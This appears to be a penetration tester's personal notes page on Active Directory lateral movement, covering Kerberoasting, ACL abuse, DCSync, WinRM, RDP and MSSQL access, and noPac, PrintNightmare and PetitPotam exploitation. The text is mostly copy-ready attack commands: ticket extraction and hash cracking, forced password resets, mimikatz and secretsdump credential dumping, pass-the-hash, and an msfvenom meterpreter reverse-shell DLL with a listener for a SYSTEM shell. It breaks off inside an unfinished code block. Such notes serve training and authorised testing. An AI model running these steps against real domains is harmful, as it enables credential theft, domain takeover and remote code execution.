---
title: Notes | AD Lateral Movement
author: Zeropio
date: 2022-08-15
categories: [Notes, System]
tags: [windows, ad]
permalink: /notes/system/ad-lateral-movement
---

# Kerberoasting 

**Kerberoasting** is a lateral movement in AD environments, targeting the Service Principal Names (**SPN**). This are unique id that Kerberos uses. Any domain user can request Kerberos ticket. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host. 

Finding SPNs with highly privileged accounts in Windows environments is very common. However, the ticket (TGS-REP) is encrypted with NTLM, so may need to bruteforci it. Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username.

Depending on your position in a network, this attack can be performed in multiple ways:
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

Several tools can be utilized to perform the attack:
- Impacket’s [GetUserSPNs.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline. Also, this NTLM are often harder to crack than other system hashes. And getting this ticket doesn't grant any high privileged account.

> A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Also, knowing which host is the Domain Controller.
{: .prompt-danger}

## From Linux 

Start gathering a list of SPNs in the domain. We can authenticate in the DC with a cleartext password, NT password hash or even a Kerberos ticket. With the following command a credential prompt will be generated. Here we will see all the SPNs:
```console
zero@pio$ GetUserSPNs.py -dc-ip <IP> <DOMAIN>.LOCAL/<USER>
```

We can now pull all TGS tickets for offline processing using the `-request` flag for all the SPNs:
```console
zero@pio$ GetUserSPNs.py -dc-ip <IP> <DOMAIN>.LOCAL/<USER> -request
```

We can also just request the TGS ticket from one account:
```console
zero@pio$ GetUserSPNs.py -dc-ip <IP> <DOMAIN>.LOCAL/<USER> -request-user <USER> -outputfile <OUTPUT FILE>
```

With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. Use the flag `-outputfile` to have the hash more handy. Use the following syntax to crack it:
```console
zero@pio$ hashcat -m 13100 hash_file <WORDLIST>
```

If we crack it, we can test the password:
```console
zero@pio$ sudo crackmapexec smb <IP> -u <USER< -p <PASSWORD>
```

## From Windows 

### Semi Manual method

Before **Rubeus** stealing a Kerberos ticket was a complex process. First, enumerate with [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary:
```console
C:\zeropio> setspn.exe -Q */*
```

To request with a single user:
```console
PS C:\zeropio> Add-Type -AssemblyName System.IdentityModel
PS C:\zeropio> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<DOMAIN>/<USER>"
```

The flow of the command was:
- The `Add-Type` cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- `System.IdentityModel` is a namespace that contains different classes for building security token services
- We'll then use the `New-Object` cmdlet to create an instance of a .NET Framework object
- We'll use the `System.IdentityModel.Tokens` namespace with the `KerberosRequestorSecurityToken` class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

We can also choose to retrieve all tickets using the same method:
```console
PS C:\zeropio> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

> This will also pull all computer accounts, so it is not optimal.
{: .prompt-alert}

Now we can use **mimikatz**:
```console
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

We need to specify `base64 /out:true` or mimikatz will extract the tickets and write them to **.kirbi** files. Now we can take base64 blolb and remove new lines and white spaces:
```console
zero@pio$ echo "<base64 blob>" |  tr -d \\n
```

We  can place the above single line of output into a file and convert it back to a .kirbi file using the base64 utility:
```console
zero@pio$ cat encoded_file | base64 -d > ticket.kirbi
```

Next, we can use this version of the [kirbi2john.py](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) tool to extract the Kerberos ticket from the TGS file:
```console
zero@pio$ python2.7 kirbi2john ticket.kirbi
```

This will create a file called **crack_file**. We must modify the file to be able to use hashcat:
```console
zero@pio$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > tgs_hashcat
```

Now we can crack it with hashcat:
```console
zero@pio$ hashcat -m 13100 tgs_hashcat <WORDLIST>
```

If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run kirbi2john.py against them directly, skipping the base64 decoding step.

### Tool Based Route 

First, use PowerView to extract the TGS tickets:
```console
PS C:\zeropio> Import-Module .\PowerView.ps1
PS C:\zeropio> Get-DomainUser * -spn | select samaccountname
```

Target a specific user:
```console
PS C:\htb> Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
```

Export all tickets to CSV:
```console
PS C:\zeropio> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<USER>_tgs.csv -NoTypeInformation
```

We can also use [Rubeus](https://github.com/GhostPack/Rubeus) from GhostPack to perform Kerberoasting even faster and easier.:
```console
PS C:\zeropio> .\Rubeus.exe
```

Rubeus include:
- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting

We can use Rubeus to gather some stats:
```console
PS C:\zeropio> .\Rubeus.exe kerberoast /stats
```

We can use Rubeus to request tickets for accounts with the **admincount** attribute set to **1**. Specify the `/nowrap` flag so the hash can be easily copied:
```console
PS C:\zeropio> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Encryption Types 

Kerberoasting tools typically request **RC4 encryption** when performing the attack and initiating TGS-REQ requests. RC4 is weakier and easier to crack offline, than other encryption algorithms like AES-128 or AES-256. Kerberoasting will usually retrieve hashes that begins with **$krb5tgs$23$**, and RC4 (type 23) ecnrypted ticket. It is possible to crack AES-128 (type 17) and AES-256 (type 18) but it will be time consuming.

Let's see an example. Getting the following ticket:
```console
PS C:\zeropio> .\Rubeus.exe kerberoast /user:test1 /nowrap

...
[*] Hash                   : $krb5tgs$23$*test1...
```

We can see it's type 23. We can check the **msDS-SupportedEncryptionTypes**. If it is set at **0** means the encryption is not defined and set default as **RC4_HMAC_MD5**:
```console
PS C:\zeropio> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
test1/kerberoast.inlanefreight.local                            0 testspn
```

If it is set to **24** it's mean that AES 128/256 encryption are the only ones supported. If we found the type **18** we will need to use hashcat mode 19700:
```console
zero@pio$ hashcat -m 19700 hash <WORDLIST>
```

---

# Access Control List (ACL) Abuse Primer 

ACLs are lists that define who has access to which asset/resource and the level of access they are provisioned. The settings are called **Access Control Entities** (**ACEs**). Each ACE maps back to an object of the AD. There are two types:
- **Discretionary Access Control List** (**DACL**): defines which security principals are granted or denied access to an object
- **System Access Control Lists** (**SACL**): allow administrators to log access attempts made to secured objects

There are three main types of ACEs:
- **Access denied ACE**: used within a DACL to show that a user or group is explicitly denied access to an object
- **Access allowed ACE**: used within a DACL to show that a user or group is explicitly granted access to an object
- **System audit ACE**: used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred

Each ACE is made up of the following four components:
1. SID of the user/group that has access to the object
2. flag denoting the type of ACE
3. flags that specify if the child containers/objects can inherit the given ACE from the primary or parent object
4. access mask (32 bit value) that defines the rights granted to an object 

Attackers utilize ACE entries to either further access or establish persistence. Many Organizations are unawared of these ACEs applied to each object. They cannot be detected by vulnerability scanning tools, so often can pass without being notice. ACL abuse can be a great way to move laterally/vertically. Some examples of Active Directory object security permissions are:
- **ForceChangePassword** abused with **Set-DomainUserPassword**
- **Add Members abused with Add-DomainGroupMember**
- **GenericAll** abused with **Set-DomainUserPassword** or **Add-DomainGroupMember**
- **GenericWrite** abused with **Set-DomainObject**
- **WriteOwner** abused with **Set-DomainObjectOwner**
- **WriteDACL** abused with **Add-DomainObjectACL**
- **AllExtendedRights** abused with **Set-DomainUserPassword** or **Add-DomainGroupMember**
- **Addself** abused with **Add-DomainGroupMember**

![ACL Attack Overview](/assets/img/notes/system/ACL_attacks_graphic.png)

We can use ACL attacks for:
- Lateral movement
- Privilege escalation
- Persistence

Some common scenarios are:

| **Attack**   | **Description**    |
|--------------- | --------------- |
| *Abusing forgot password permissions* | Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks |
| *Abusing group membership management* | It's also common to see Help Desk and other staff that have the right to add/remove users from a given group |
| *Excessive user rights* | We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of |

> Some ACL attacks can be considered "destructive," such as changing a user's password or performing other modifications within a client's AD domain.
{: .prompt-danger}

## Enumeration 

### PowerView

We can use PowerView to enumerate ACLs. Running the following function will give us a massive amount of information:
```console
PS C:\zeropio> Find-InterestingDomainAcl
```

This amount of data is time-consuming, so we will need a different approach to it. With PowerView, we can try the following with a user we have credentials:
```console
PS C:\zeropio> Import-Module .\PowerView.ps1
PS C:\zeropio> $sid = Convert-NameToSid <USER>
```

We can now use `Get-DomainObjectACL` to search:
```console
PS C:\zeropio> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Search now the `ObjectAceType` output on the Internet to understand which ACE are we facing. PowerView can also be used:
```console
PS C:\zeropio> $guid= "<GUID>"
PS C:\zeropio> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

We can directly set the PowerView to tell us which ACE is with the flag `-ResolveGUIDs`:
```console
PS C:\zeropio> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

Let's make now a list of all domain users:
```console
PS C:\zeropio> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

Now, for each user, we will retrieve the ACL information. Then selecth the **Access property**. Finally, the `IdentityReference` to the user we are in control:
```console
PS C:\zeropio> foreach($line in [System.IO.File]::ReadLines("<PATH TO>\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<DOMAIN>\\<USER>'}}
```

Then follow the previous process to convert the GUID in human-readable format. The output of this command will be users that we may have control over them. Let's use PowerView to see which permissions has the next target, that we get in the previous command:
```console
PS C:\zeropio> $sid2 = Convert-NameToSid <NEXT USER>
PS C:\zeropio> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

Maybe we see here something of interes we may want to analyze digger:
```console
PS C:\zeropio> Get-DomainGroup -Identity "<GROUP OF THE TARGET>" | select memberof
```

We can now check that group:
```console
PS C:\zeropio> $itgroupsid = Convert-NameToSid "<GROUP>"
PS C:\zeropio> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

Keep searching the objects we will be finding. This can lead to a user takeover, a group takeover and others users takeover. With other privileges and permissions to sites we don't have access.

### BloodHound 

In BloodHound GUI we can select our start user as our starting node, in the **Node Info** scroll down to **Outbound Control Rights**. We will see object we have directly control.

## ACL Abuse Tactics 

First, we must authenticate as the user we have and change the password of the user we have control of. Authentication:
```console
PS C:\zeropio> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\zeropio> $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
```

Now create a **SecureString Object**, which will be the password for the other user:
```console
PS C:\zeropio> $Password = ConvertTo-SecureString '<NEW PASSWORD>' -AsPlainText -Force
```

Finally, we use the function **Set-DomainUserPassword** to change the password:
```console
PPS C:\zeropio> Import-Module .\PowerView.ps1
PS C:\zeropio> Set-DomainUserPassword -Identity <TARGET USER> -AccountPassword $Password -Credential $Cred -Verbose
```

> We can do this in a Linux host with a tool like **pth-net**, from [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).
{: .prompt-tip}

Now authenticate in the user:
```console
PS C:\zeropio> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\zeropio> $Cred2 = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<TARGET USER>', $SecPassword)
```

Now we can add that user to other groups:
```console
PS C:\zeropio> Get-ADGroup -Identity "<GROUP>" -Properties * | Select -ExpandProperty Members
PS C:\zeropio> Add-DomainGroupMember -Identity '<GROUP>' -Members '<TARGET USER>' -Credential $Cred2 -Verbose
PS C:\zeropio> Get-DomainGroupMember -Identity "<GROUP>" | Select MemberName
```

At this point, we should be able to leverage our new group membership to take control over other user. If we cannot change the password of the third user, we can try a Kerberoasting attack with the property **GenericAll**. Create a fake SPN:
```console
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Now use Rubeus to perform the Kerberoasting:
```console
PS C:\zeropio> .\Rubeus.exe kerberoast /user:<THIRD TARGET> /nowrap
```

### Cleanup

If we want to cleanup this process we must:
1. Remove the fake SPN we created 
2. Remove the second user from the group we added him
3. Set the password for the second user back to its original value (if we know it) or have our client set it/alert the user

To remove the fake SPN:
```console
PS C:\zeropio> Set-DomainObject -Credential $Cred2 -Identity <THIRD USER> -Clear serviceprincipalname -Verbose
```

Next, we'll remove the user from the group:
```console
PS C:\zeropio> Remove-DomainGroupMember -Identity "<GROUP>" -Members '<USER>' -Credential $Cred2 -Verbose
```

## DCSync 

If we have access with a user with DCSync privileges we can steal AD password database, by the **Directory Replication Service Remote Protocol**. This allow us to mimic the DC and retrieve user NTLM password hashes. We need to request a DC to replicate passwords via the **DS-Replication-Get-Changes-All** extended right. Domain/Enterprise Admins and default domain administrators have this right by default. 

We can check if a user has this privilege:
```console
PS C:\zeropio> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

We can confirm it with **Get-ObjectACL**:
```console
PS C:\zeropio> $sid= "<SID OF USER>"
PS C:\zeropio> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

With certain rights over the user (for example **WriteDacl**) we can even add this privilege. 

To extract all the hashes we can use **secretsdump.py**:
```console
zero@pio$ secretsdump.py -outputfile <OUTPUT FILE> -just-dc <DOMAIN>/<USER>@<DOMAIN CONTROLLER IP>
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-just-dc` | generate three files, NTLM hashes, Kerberos keys and cleartext passwords from NTDS with reversible encryption enabled |
| `-just-dc-ntlm` | only NTLM hashes |
| `-just-dc-user <USER>` | specific user |
| `-pwd-last-set` | see when each account's password was changed |
| `-history` | dump password history |
| `-user-status` | check and see if a user is disabled |

We can enumerate all the users with this reversible encryption:
```console
PS C:\zeropio> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

Or:
```console
PS C:\zeropio> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
```

This attack can be done with mimikatz as well:
```console
PS C:\zeropio> .\mimikatz.exe

mimikatz # lsadump::dcsync /domain:<DOMAIN>.LOCAL /user:<DOMAIN>\administrator
```

If we want to impersonate before doing it:
```console
mimikatz # sekurlsa::pth /user:<USER> /ntlm:<NTLM HASH> /domain:<DOMAIN>.local /impersonate
```

We can also execute commands through mimikatz to spawn a cmd (we need to be connect to RDP) with the Psexec.exe util in the same folder:
```console
mimikatz # sekurlsa::pth /user:administrator /ntlm:<NTLM HASH> /domain:<DOMAIN>.local /run:".\psexec.exe /accepteula \\<COMPUTER NAME>.<DOMAIN>.local -h cmd.exe" 
```

---

# Lateral And Vertical Movement

With foothold on the domain, now we need to move further vertically or laterally. If we don't have access to the admin we can try the following:
- **Remote Desktop Protocol** (**RDP**)
- [Powershell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2)
- **MSSQL Server**

BloodHound could help us with:
- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

### Remote Desktop 

Usually we will have RDP access with users we find. Sometimes we can't have access to some machines (like the DC), but we can access others to:
- Launch further attacks
- Be able to escalate privileges and obtain credentials for a higher privileged user
- Be able to pillage the host for sensitive data or credentials

With PowerView we can enumerate the members of the **Remote Desktop Users** group on a machine:
```console
PS C:\zeropio> Get-NetLocalGroupMember -ComputerName <COMPUTER NAME> -GroupName "Remote Desktop Users"
```

We can also check this in BloodHound in the **Node Info**, **Execution Rights**.

### WinRM

We can check this with **Get-NetLocalGroupMember** to the **Remote Management Users** group:
```console
PS C:\zeropio> Get-NetLocalGroupMember -ComputerName <COMPUTER NAME> -GroupName "Remote Management Users"
```

We can also utilize this custom Cypher query in BloodHound to hunt for users with this type of access:
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

We can stablish a WinRM session from Windows:
```console
PS C:\zeropio> $password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS C:\zeropio> $cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
PS C:\zeropio> Enter-PSSession -ComputerName <COMPUTER NAME> -Credential $cred
```

From Linux we can use [evil-winrm](https://github.com/Hackplayers/evil-winrm):
```console
zero@pio$ evil-winrm -i <IP> -u <USER>
```

### SQL Server Admin 

Often we will find SQL Server. The tool [Snaffler](https://github.com/SnaffCon/Snaffler) can help us finding credentials for this. Also, with BloodHound we can check for **SQL Admin Rights** in the **Node Info** or with this query:
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

With the previous attacks (ACL) and the [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) (check this [cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)) we can authenticate:
```console
PS C:\zeropio>  Import-Module .\PowerUpSQL.ps1
PS C:\zeropio>  Get-SQLInstanceDomain
PS C:\zeropio>  Get-SQLQuery -Verbose -Instance "<IP>,<PORT>" -username "<DOMAIN LOWERCASE>\<USER>" -password "<PASSWORD>" -query 'Select @@version'
```

Or use the [mssqlclient.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py) from Linux:
```console
zero@pio$ mssqlclient.py <DOMAIN>/<USER>@<IP> -windows-auth
```

Once connected we can type `help` to see the aviable commands. For example, we can enabled commands:
```console
SQL > enable_xp_cmdshell
SQL > xp_cmdshell whoami /priv
```

## Kerberos "Double Hop" 

There is a issue known as *Double Hop* that occurs when hops between two or more hosts. Often occurs when using WinRM or Powershell since the default authentication only provides a ticket. This will cause issues when performing lateral movement. When using WinRM to authenticate to two or more connections the user's password is never cached. When we use Kerberos we are not using a password for authentication. When a password is used, the NTLM hash is stored in the session. 

If we authenticate to a remote host via WinRM and use mimikatz as **backupadm** we won't see any credentials in memory for other users.
```console
PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit 

mimikatz(commandline) # privilege::debug 
mimikatz(commandline) # sekurlsa::logonpasswords
```

There are process running under **backupadm** (like **wsmprovhost.exe**, which is the process that spawns a Windows Remote Powershell):
```console
[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
```

Take the following example. We are hoping from our host to **DEV01** with **evil-winrm**, so our credentials are not stored in memory. We can use tools like PowerView, but Kerberos has no way of telling the DC that our user can access resources. This happen because the Kerberos TGT is not sent to the remote session. hen the user attempts to access subsequent resources in the domain, their TGT will not be present in the request.

If unconstrained delegation is enabled on a server, it is likely we won't face the *Double Hop* problem. We can try to overcome this issue:

### PSCredential Object 

We can connect to the remote host and set up a PSCredential object to pass our credentials. We try to import the PowerView, getting an error:
```console
*Evil-WinRM* PS C:\host1> Import-Module .\PowerView.ps1
```

If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server:
```console
*Evil-WinRM* PS C:\zeropio> klist
```

Let's set up a PSCredential object. First, authentication:
```console
*Evil-WinRM* PS C:\zeropio> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

Now we can try to query the SPN accounts using PowerView:
```console
*Evil-WinRM* PS C:\zeropio> get-domainuser -spn -credential $Cred | select samaccountname
```

If we try again without specifying the `-credential` flag. If we RDP to the same host, open a CMD prompt, and type klist, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. 

### Register PSSession Configuration 

If we are on a domain-joined host and can connect to another using WinRM, or from a Windows attack host and connect to our target via WinRM using **Enter-PSSession** cmdlet, we need to do the following. First, stablish the WinRM session:
```console
PS C:\zeropio> Enter-PSSession -ComputerName <COMPUTER NAME> -Credential <DOMAIN>\backupadm
```

If we check for cached tickets using `klist`, we'll see that the same problem exists. We also cannot interact directly with the DC using PowerView. One trick we can use here is registering a new session configuration using the **Register-PSSessionConfiguration** cmdlet.
```console
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential <DOMAIN>\backupadm
```

nce this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This works because our local machine will now impersonate the remote machine in the context of the **backupadm** user and all requests from our local machine will be sent directly to the Domain Controller.

> We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Also, `RunAs` can only be used in a elevated PowerShell terminal.
{: .prompt-alert}

## Bleeding Edge Vulnerabilities 

### NoPac (SamAccountName Spoofing)

The [Sam\_The\_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), called as **noPac** or **SamAccountName Spoofing**. This vulnerability are contend in two CVEs: [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287). 

| **42278**   | **42287**    |
|--------------- | --------------- |
| bypass vulnerability with the SAM | vulnerability within the Kerberos PAC in ADDS |

This exploit consist in being able to change the **SamAccountName** of a computer account to that of a DC. Authenticated users can add up to tem compuerts to domain. When doing it, we change the name of the new host to macht the DC's SamAccountName. We must request a tickets to Kerberos, causing the service to issue a ticket under the DC?s name instead of the new name. We will have accesss as that service and provided with SYSTEM shell in the DC. [Here](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware) are a better explanation.

this [tool](https://github.com/Ridter/noPac) can be helpful while doing it. Be sure that Impacket is installed in order to work. Cloned the repo and use the **scanner.py** and **noPac.py** to gain the shell. If the scanner identifies the DC as vulnerable we will notice the **ms-DS-MachineAccountQuota** set to 10. IF it is set to 0 the attack won't success. This is a protection against some AD attacks.
```console
zero@pio$ sudo python3 scanner.py <DOMAIN>.local/<USER>:<PASSWORD> -dc-ip <DC IP> -use-ldap
```

This attack could be *noisy* and be blocked by AV or EDR:
```console
zero@pio$ sudo python3 noPac.py <DOMAIN>.LOCAL/<USER>:<PASSWORD> -dc-ip <DC IP>  -dc-host <HOST> -shell --impersonate administrator -use-ldap
```

Using [smbexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbexec.py) a semi-interactive shell will spawn. It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use the ccache file to perform a *pass-the-ticket* attack, like DCSync. Also, the flag `-dump` will perform a DCSync using **secretsdump.py** (make sure to remove the ccache file created after):
```console
zero@pio$ sudo python3 noPac.py <DOMAIN>.LOCAL/<USER>:<PASSWORD> -dc-ip <DC IP>  -dc-host <DC HOST> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
```

If Windows Defender (or another AV/EDR) is enabled, any command in the shell may fail. Using **smbexec.py** will create a service called **BTOBTO**, any command sent will go to **execute.bat**. With each new command, a new batch script will be created, executed and deleted.

## PrintNightmare

  **PrintNightmare** is the nickname to two CVE ([2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the **Print Spooler service**. This allow RCE and PE. We will be using this [tool](https://github.com/cube0x0/CVE-2021-1675). We need the *cube0x0*'s version of Impacket:
```console
zero@pio$ git clone https://github.com/cube0x0/CVE-2021-1675.gi
zero@pio$ pip3 uninstall impacket
zero@pio$ git clone https://github.com/cube0x0/impacket 
zero@pio$ cd impacket; python3 ./setup.py install
```

We can use **rpcdump.py** to check if **Print System Asynchronous Protocol** and **Print System Remote Protocol**:
```console
zero@pio$ rpcdump.py @<IP> | egrep 'MS-RPRN|MS-PAR'
```

After confirming it, we can create a DDL payload:
```console
zero@pio$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8080 -f dll > backupscript.dll
```

We will host this payload in a SMB share using **smbserver.py**:
```console
zero@pio$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

We can use MSF now to start a listener:
```console
msf > use exploit/multi/handler
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp 
msf > set LHOST 10.129.202.111 
msf > set LPORT 8080
msf > run
```

Now, run the exploit:
```console
zero@pio$ sudo python3 CVE-2021-1675.py <DOMAIN>.local/<USER>:<PASSWORD>@172.16.5.5 '\\<OUR IP>\CompData\backupscript.dll'
```

If everything works, we will have a SYSTEM shell.

### PetitPotam (MS-EFSRPC) 

PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing. An unauthenticated attacker can coarce the DC to authenticate against another host using NTLM over oort 445 via **Local Security Authority Remote Protocol** (**LSARPC**), by abusing Microsoft's **Encrypting FIle System Remote Protocol** (**MS-EFSRPC**). This allows an unauthenticated attacker to take over a Windows Domain where **Active Directory Certificate Services** (**AD CS**) are in use. This can be used with **Rubeus** or **gettgtpkinit.py** from [PKINITtools](https://github.com/dirkjanm/PKINITtools). [Here](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) is explain in detail.

First, we need to start **ntlmrelayx.py**, specifying the **Web Enrollment URL** for the CA host, using KerberosAuthentication or DomainController AD CS template. We could use a tool like [certi](https://github.com/zer1t0/certi) to locate the cert.
```console
zero@pio$ sudo ntlmrelayx.py -debug -smb2support --target http://<DC COMPUTER NAME>.<DOMAIN>.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

While this is running, execute [PetitPotam.py](https://github.com/topotam/PetitPotam). There is an executable version for Windows host. ALso, mimikatz has this authentication trigger and can be use as `misc::efs /server:<DC> /connect:<ATTACK HOST>`. Also, here we have the [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1). Using the [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8):
```console
zero@pio$ python3 PetitPotam.py <ATTACK HOST> <DC HOST>  
```

If we successfull execute it, we will see a login request, and obtain the base64 encoded certificate for the DC. With this certificate, we can use **gettgtgpkinit.py** to request a TGT for the DC:
```console
zero@pio$ python3 gettgtpkinit.py <DOMAIN>.LOCAL/<DC COMPUTER NAME>\$ -pfx-base64 <BASE64 CERT> dc01.ccache
```

The TGT request was saved in **dc01.ccache**. We can now use the **KRB5CCNAME** environment variable, so our attack host uses this file for Kerberos authentication attempt:
```console
zero@pio$ export KRB5CCNAME=dc01.ccache
```

We can use this TGT with **secretsdump.py** to perform a DCSync and retrieve the NTLM hashes:
```console
zero@pio$ secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "<DC COMPUTER NAME>$"@<DC COMPUTER NAME>.<DOMAIN>.LOCAL
```

We could also use a more straightforward command: `secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DC COMPUTER NAME>.<DOMAIN>.LOCAL` because the tool will retrieve the username from the ccache file. We can use `klist` (installed from [krb5-user](https://packages.ubuntu.com/focal/krb5-user)) to check it.

We can now confirm the NTLM:
```console
